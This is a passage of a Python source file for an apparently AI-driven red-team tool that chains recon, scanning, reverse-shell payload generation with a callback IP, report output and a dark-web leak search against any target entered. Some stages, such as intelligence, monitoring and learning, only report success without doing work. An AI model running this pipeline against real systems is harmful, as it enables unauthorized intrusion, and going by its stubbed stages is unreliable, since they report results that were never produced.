        """CVSS + context-aware prioritization"""
        scored = []
        for finding in findings:
            cvss = self._calculate_cvss(finding)
            priority = self._calculate_priority(finding, cvss)
            scored.append({**finding, 'cvss': cvss, 'priority': priority})
        return sorted(scored, key=lambda x: x['priority'], reverse=True)
    
    def _calculate_cvss(self, finding: Dict) -> float:
        base = 0.0
        if finding.get('severity') == 'high': base = 9.0
        elif finding.get('severity') == 'medium': base = 6.0
        return min(base + 0.5, 10.0)  # Max CVSS 10.0
    
    def _calculate_priority(self, finding: Dict, cvss: float) -> float:
        exploit_factor = 2.0 if 'rce' in finding.get('title', '').lower() else 1.0
        return cvss * exploit_factor

prioritizer = PrioritizationEngine()

# ========================================
# REPORTING & EVIDENCE SYSTEM
# ========================================
class ReportEngine:
    def generate_full_report(self, target: str):
        """Generate HTML + evidence report"""
        findings = db.get_findings(target) if hasattr(db, 'get_findings') else []
        prioritized = prioritizer.score_findings(findings)
        html = self._render_html_report(target, prioritized)
        report_path = Path(f"redteam_report_{target.replace('/', '_')}.html")
        with report_path.open("w") as f:
            f.write(html)
        console.print(f"[green]📊 Full report: {report_path.name}[/green]")
        try:
            webbrowser.open(report_path.resolve().as_uri())
        except Exception:
            pass

    def _render_html_report(self, target: str, findings: List) -> str:
        unique_findings = []
        seen = set()
        for finding in findings:
            key = (finding.get('title'), finding.get('description'), finding.get('evidence'))
            if key in seen:
                continue
            seen.add(key)
            unique_findings.append(finding)

        if not unique_findings:
            summary_html = '<p>No confirmed vulnerabilities were validated. Review WAF detection and manual verification results.</p>'
        else:
            summary_html = f'<p>Total confirmed findings: {len(unique_findings)}</p>'

        findings_html = ''
        for f in unique_findings:
            color = 'red' if f.get('cvss', 0) > 7 else 'orange'
            findings_html += f"""
            <div class=\"finding {color}\">
                <h3>{f.get('title', 'Finding')}</h3>
                <p><strong>Stage:</strong> {f.get('stage', 'unknown')} | <strong>Severity:</strong> {f.get('severity', 'unknown')} | <strong>CVSS:</strong> {f.get('cvss', 0):.1f}</p>
                <p>{f.get('description', '')}</p>
                <p><strong>Remediation:</strong> {f.get('remediation', '')}</p>
                <details><summary>Evidence</summary><pre>{f.get('evidence', '')}</pre></details>
            </div>
            """

        return f"""
<!DOCTYPE html>
<html>
<head><title>RedTeam Report - {target}</title>
<style>
body {{ font-family: Arial; margin: 40px; background: #111; color: #fff; }}
.finding {{ padding: 20px; margin: 20px 0; border-radius: 8px; background: #181818; }}
.red {{ border-left: 5px solid #f44336; }}
.orange {{ border-left: 5px solid #ff9800; }}
summary {{ cursor: pointer; color: #aad9ff; }}
pre {{ background: #0f0f0f; padding: 12px; border-radius: 6px; overflow-x: auto; }}
</style></head>
<body>
<h1>🚀 RedTeam Autonomous Pentest Report</h1>
<h2>Target: {target}</h2>
<div>{summary_html}</div>
<div id=\"findings\">{findings_html}</div>
</body></html>
        """

reports = ReportEngine()

@app.route("/")
def dashboard():
    findings = db.get_all_findings()
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>RedTeam Vulnerability Dashboard</title>
  <style>
    body { font-family: Arial, sans-serif; background: #121212; color: #f0f0f0; margin: 0; padding: 20px; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { padding: 12px; border: 1px solid #333; }
    th { background: #1f1f1f; }
    tr:nth-child(even) { background: #1a1a1a; }
    .high { color: #ff6b6b; }
    .medium { color: #f7b731; }
    .info { color: #4dadf7; }
  </style>
</head>
<body>
  <h1>RedTeam Vulnerability Dashboard</h1>
  <p>Live vulnerability findings from the current run.</p>
  <table>
    <thead>
      <tr>
        <th>Timestamp</th>
        <th>Target</th>
        <th>Stage</th>
        <th>Severity</th>
        <th>Title</th>
        <th>CVSS</th>
        <th>Evidence</th>
      </tr>
    </thead>
    <tbody>
      {% for finding in findings %}
      <tr class="{{ finding.severity }}">
        <td>{{ finding.timestamp }}</td>
        <td>{{ finding.target }}</td>
        <td>{{ finding.stage }}</td>
        <td>{{ finding.severity }}</td>
        <td>{{ finding.title }}</td>
        <td>{{ finding.cvss_score or 'N/A' }}</td>
        <td><pre style="white-space: pre-wrap; max-height: 120px; overflow: auto;">{{ finding.evidence }}</pre></td>
      </tr>
      {% endfor %}
    </tbody>
  </table>
</body>
</html>
""", findings=findings)

@app.route("/findings")
def findings_api():
    return jsonify(db.get_all_findings())


def start_dashboard(host: str = '127.0.0.1', port: int = 5000):
    def run_app():
        socketio.run(app, host=host, port=port, debug=False, use_reloader=False)
    thread = threading.Thread(target=run_app, daemon=False)
    thread.start()
    url = f"http://{host}:{port}"
    console.print(f"[green]Dashboard running at {url}[/green]")
    try:
        webbrowser.open(url)
    except Exception:
        pass
    return thread

# ========================================
# MAIN ORCHESTRATOR
# ========================================
class RedTeamOrchestrator:
    def __init__(self):
        self.target = None
        self.mode = 'autonomous'
        self.persona = 'kali_fast'
    
    def set_mode(self, mode: str):
        if mode in config.MODES:
            self.mode = mode
            console.print(f"[green]Mode set to {mode}: {config.MODES[mode]}[/green]")
        else:
            console.print(f"[yellow]Unknown mode {mode}, using autonomous mode[/yellow]")
            self.mode = 'autonomous'

    def set_persona(self, persona: str):
        if persona in config.PERSONAS:
            self.persona = persona
            console.print(f"[green]Persona set to {persona}: {config.PERSONAS[persona]}[/green]")
        else:
            console.print(f"[yellow]Unknown persona {persona}, using default persona[/yellow]")
            self.persona = 'kali_fast'

    def execute_full_pipeline(self, target: str):
        """Execute the FINAL PIPELINE"""
        console.print(Panel(f"[bold green]🚀 REDTEAM PIPELINE STARTING: {target}[/bold green]",
                           border_style="red"))
        pipeline_model = model_manager.select_model(self.mode, 'pipeline')
        recon_model = model_manager.select_model(self.mode, 'recon')
        intel_model = model_manager.select_model(self.mode, 'intelligence')
        scan_model = model_manager.select_model(self.mode, 'scan')
        analysis_model = model_manager.select_model(self.mode, 'analysis')
        validation_model = model_manager.select_model(self.mode, 'validation')
        prioritize_model = model_manager.select_model(self.mode, 'prioritize')
        report_model = model_manager.select_model(self.mode, 'report')
        exploit_model = model_manager.select_model(self.mode, 'exploit')

        console.print(f"[cyan]Persona:[/cyan] {self.persona} | [cyan]Primary model:[/cyan] {pipeline_model}")
        console.print(f"[cyan]Selected models:[/cyan] recon={recon_model}, intel={intel_model}, scan={scan_model}, analysis={analysis_model}, validation={validation_model}, prioritize={prioritize_model}, report={report_model}, exploit={exploit_model}")

        # 1. RECON
        console.print(f"[cyan]Recon model:[/cyan] {recon_model}")
        console.print("[bold cyan]🔍 STAGE 1: RECONNAISSANCE[/bold cyan]")
        recon_results = recon.full_recon(target)
        db.add_finding(target, 'recon', 'info', 'Recon Complete',
                      f"Found {len(recon_results['ports'])} ports, {len(recon_results['subdomains'])} subdomains", '', '', 0.0, 0.8)

        # 2. INTELLIGENCE
        console.print(f"[cyan]Intelligence model:[/cyan] {intel_model}")
        console.print("[bold cyan]🧠 STAGE 2: INTELLIGENCE GATHERING[/bold cyan]")
        intel = self._gather_intelligence(target)
        db.add_finding(target, 'intelligence', 'info', 'Intelligence Complete', str(intel), '', '', 0.0, 0.85)

        # 3. SCAN
        console.print(f"[cyan]Scan model:[/cyan] {scan_model}")
        console.print("[bold cyan]🔎 STAGE 3: VULNERABILITY SCAN[/bold cyan]")
        vuln_findings = vuln_engine.scan_web(target)
        db.add_finding(target, 'scan', 'info', 'Vuln Scan Started', f"Using scan model {scan_model}", '', '', 0.0, 0.7)
        console.print(f"[green]Scan phase returned {len(vuln_findings)} validated finding(s).[/green]")

        vuln_phase = fusion_engine.run_parallel_phase('vuln', f"Generate vulnerability scan strategy for {target}")
        console.print(f"[green]Fused vuln output ({vuln_phase['confidence']:.2f}):[/green] {vuln_phase['fused_output'][:200]}...")

        # 4. ANALYSIS & VALIDATION
        console.print(f"[cyan]Analysis model:[/cyan] {analysis_model}")
        console.print(f"[cyan]Validation model:[/cyan] {validation_model}")
        console.print("[bold cyan]📊 STAGE 4-5: ANALYSIS + VALIDATION[/bold cyan]")
        prioritized = prioritizer.score_findings(vuln_findings)

        # 5. PRIORITIZE
        console.print(f"[cyan]Prioritization model:[/cyan] {prioritize_model}")
        console.print("[bold cyan]🎯 STAGE 6: PRIORITIZATION[/bold cyan]")
        for finding in prioritized[:5]:
            console.print(f"[red]HIGH PRIORITY: {finding.get('title')} (CVSS {finding.get('cvss'):.1f})[/red]")

        # 6. EXPLOIT GENERATION
        console.print(f"[cyan]Exploit model:[/cyan] {exploit_model}")
        console.print("[bold cyan]💣 STAGE 7: EXPLOIT GENERATION[/bold cyan]")
        shells = exploits.generate_reverse_shells("10.11.11.11")
        console.print("[yellow]Reverse shells ready:[/yellow]")
        for lang, payload in shells.items():
            console.print(f"  {lang}: {payload[:80]}...")

        # 7. REPORT
        console.print(f"[cyan]Report model:[/cyan] {report_model}")
        console.print("[bold cyan]📈 STAGE 8: REPORT GENERATION[/bold cyan]")
        reports.generate_full_report(target)

        # 8. MONITOR
        console.print("[bold cyan]👁️  STAGE 9: MONITORING STARTED[/bold cyan]")
        self._monitor(target)

        # 9. LEARN
        console.print("[bold cyan]🧠 STAGE 10: LEARNING LOOP[/bold cyan]")
        self._learn(target)

        console.print(Panel("[bold green]✅ FULL PIPELINE COMPLETE[/bold green]",
                           border_style="green"))

    def _gather_intelligence(self, target: str) -> Dict:
        return {"osint": "complete", "breach": "checked", "reputation": "analyzed"}

    def _monitor(self, target: str):
        db.update_pipeline_state(target, 'monitor', 0.95)
        console.print(f"[green]Monitoring active for {target}.[/green]")

    def _learn(self, target: str):
        db.update_pipeline_state(target, 'learn', 1.0)
        console.print(f"[green]Learning cycle complete for {target}. Context refreshed.[/green]")

orchestrator = RedTeamOrchestrator()

# ========================================
# RICH CLI INTERFACE
# ========================================
def show_main_menu():
    menu = Table.grid(expand=True)
    menu.add_column(justify="left", ratio=2)
    menu.add_column(justify="left", ratio=4)
    menu.add_row("[bold cyan]A[/bold cyan]", "Full autonomous pipeline")
    menu.add_row("[bold cyan]B[/bold cyan]", "Recon only")
    menu.add_row("[bold cyan]C[/bold cyan]", "Web scan")
    menu.add_row("[bold cyan]D[/bold cyan]", "Exploit payloads")
    menu.add_row("[bold cyan]E[/bold cyan]", "Generate report")
    menu.add_row("[bold cyan]G[/bold cyan]", "Chatbot (general ChatGPT-like)")
    menu.add_row("[bold cyan]H[/bold cyan]", "Dark web leak search")
    menu.add_row("[bold cyan]I[/bold cyan]", "Launch vulnerability dashboard")
    menu.add_row("[bold cyan]M[/bold cyan]", "Set execution mode")
    menu.add_row("[bold cyan]P[/bold cyan]", "Set persona")
    menu.add_row("[bold cyan]Q[/bold cyan]", "Quit")
    console.print(Panel(menu, title="🚀 RedTeam Menu", border_style="blue"))


def parse_command(cmd: str) -> Dict[str, str]:
    cmd_lower = cmd.lower()
    if 'full' in cmd_lower or 'autonomous' in cmd_lower:
        return {'action': 'full'}
    if 'recon' in cmd_lower:
        return {'action': 'recon'}
    if 'scan' in cmd_lower or 'vuln' in cmd_lower:
        return {'action': 'scan'}
    if 'exploit' in cmd_lower or 'shell' in cmd_lower:
        return {'action': 'exploit'}
    if 'report' in cmd_lower:
        return {'action': 'report'}
    if 'chat' in cmd_lower:
        return {'action': 'chat'}
    if 'dark' in cmd_lower or 'leak' in cmd_lower or 'breach' in cmd_lower:
        return {'action': 'darkweb'}
    if 'dashboard' in cmd_lower or cmd_lower.strip() == 'i':
        return {'action': 'dashboard'}
    if cmd_lower.strip() in ['a', 'b', 'c', 'd', 'e', 'g', 'h', 'i', 'm', 'p', 'q']:
        return {'action': cmd_lower.strip()}
    return {'action': 'unknown'}


def extract_target(cmd: str) -> Optional[str]:
    match = re.search(r'(https?://[^\s]+|localhost(?::\d+)?|[\d\.]+(?:\:\d+)?|\w+\.\w+)', cmd)
    return match.group(1) if match else None


def cli_interface():
    mode_short = config.MODE_SHORT.get(orchestrator.mode, orchestrator.mode.upper())
    persona_short = config.PERSONA_SHORT.get(orchestrator.persona, orchestrator.persona.upper())
    console.print(Panel.fit("[bold red]V[/bold red]\n"
                           f"[green]Fully Autonomous Pentesting Pipeline[/green]\n"
                           f"[yellow]Mode: [bold green]{mode_short}[/bold green] | Persona: [bold cyan]{persona_short}[/bold cyan] >[/yellow]",
                           title="🚀 V", border_style="blue"))

    while True:
        try:
            show_main_menu()
            cmd = Prompt.ask("\n[bold red]V> [/bold red]", console=console)
            action = parse_command(cmd)
            target = extract_target(cmd)

            if cmd.lower().strip() in ['quit', 'exit', 'q']:
                break

            if action['action'] in ['a', 'full', 'autonomous']:
                if not target:
                    target = Prompt.ask("Enter target", console=console)
                if target:
                    orchestrator.target = target
                    orchestrator.execute_full_pipeline(target)
                else:
                    console.print("[yellow]Please specify a target.[/yellow]")

            elif action['action'] in ['b', 'recon']:
                if not target:
                    target = Prompt.ask("Enter recon target", console=console)
                if target:
                    orchestrator.target = target
                    recon.full_recon(target)
                else:
                    console.print("[yellow]Target required for recon.[/yellow]")

            elif action['action'] in ['c', 'scan']:
                if not target:
                    target = Prompt.ask("Enter scan target", console=console)
                if target:
                    orchestrator.target = target
                    vuln_findings = vuln_engine.scan_web(target)
                    console.print(f"[green]Scan found {len(vuln_findings)} potential issues.[/green]")
                else:
                    console.print("[yellow]Target required for scan.[/yellow]")

            elif action['action'] in ['d', 'exploit']:
                shells = exploits.generate_reverse_shells("YOUR_IP")
                table = Table(title="Reverse Shells")
                table.add_column("Language")
                table.add_column("Payload")
                for lang, payload in shells.items():
                    table.add_row(lang, payload[:60] + "...")
                console.print(table)

            elif action['action'] in ['e', 'report']:
                report_target = orchestrator.target
                if not report_target:
                    report_target = Prompt.ask("Enter report target", console=console)
                if report_target:
                    reports.generate_full_report(report_target)
                else:
                    console.print("[yellow]Report target required.[/yellow]")

            elif action['action'] in ['g', 'chat']:
                console.print("[green]Entering ChatGPT-style session. Type 'exit', 'quit', or 'back' to return.[/green]")
                while True:
                    question = Prompt.ask("[bold red]V-chat>[/bold red]", console=console)
                    if question.strip().lower() in ['exit', 'quit', 'back']:
                        console.print("[green]Chat session ended.[/green]")
                        break
                    if not question.strip():
                        continue
                    answer = chat_engine.ask(question, 'chat')
                    console.print(Panel.fit(answer, title="ChatGPT-style Assistant", border_style="green"))

            elif action['action'] in ['h', 'darkweb']:
                leak_query = Prompt.ask("Enter email address or keyword to search for leaked data", console=console)
                if leak_query:
                    results = dark_web_search.search(leak_query)
                    if results:
                        for item in results:
                            summary = item.get('leak_summary', '')
                            attributes = item.get('leaked_attributes', '')
                            details = f"Source: {item['site']}\n"
                            if summary:
                                details += f"Summary: {summary}\n"
                            if attributes:
                                details += f"Leaked info: {attributes}\n"
                            details += f"\n{item['snippet']}"
                            console.print(Panel.fit(details, title=item['title'], border_style="red"))
                    else:
                        console.print("[yellow]No leak-related results were found for that query.[/yellow]")
                else:
                    console.print("[yellow]Search query required.[/yellow]")

            elif action['action'] in ['i', 'dashboard']:
                start_dashboard()

            elif action['action'] in ['m']:
                mode = Prompt.ask("Enter mode", choices=list(config.MODES.keys()), default=orchestrator.mode)
                orchestrator.set_mode(mode)

            elif action['action'] in ['p']:
                persona = Prompt.ask("Enter persona", choices=list(config.PERSONAS.keys()), default=orchestrator.persona)
                orchestrator.set_persona(persona)

            else:
                console.print("[yellow]Unknown command. Use the menu or type a target-based action.[/yellow]")

        except KeyboardInterrupt:
            console.print("\n[yellow]Operation terminated.[/yellow]")
            break

# ========================================
# MAIN ENTRY POINT
# ========================================
def main():
    parser = argparse.ArgumentParser(description='HackerAI Red Team - Autonomous Pentesting')
    parser.add_argument('target', nargs='?', help='Target IP/Domain/URL')
    parser.add_argument('--mode', choices=config.MODES.keys(), default='autonomous')
    parser.add_argument('--dashboard', action='store_true', help='Start web dashboard')
    
    args = parser.parse_args()
    
    if args.dashboard:
        start_dashboard()
        if args.target:
            orchestrator = RedTeamOrchestrator()
            orchestrator.execute_full_pipeline(args.target)
        else:
            cli_interface()

    elif args.target:
        orchestrator = RedTeamOrchestrator()
        orchestrator.execute_full_pipeline(args.target)
    
    else:
        cli_interface()

if __name__ == "__main__":
    main()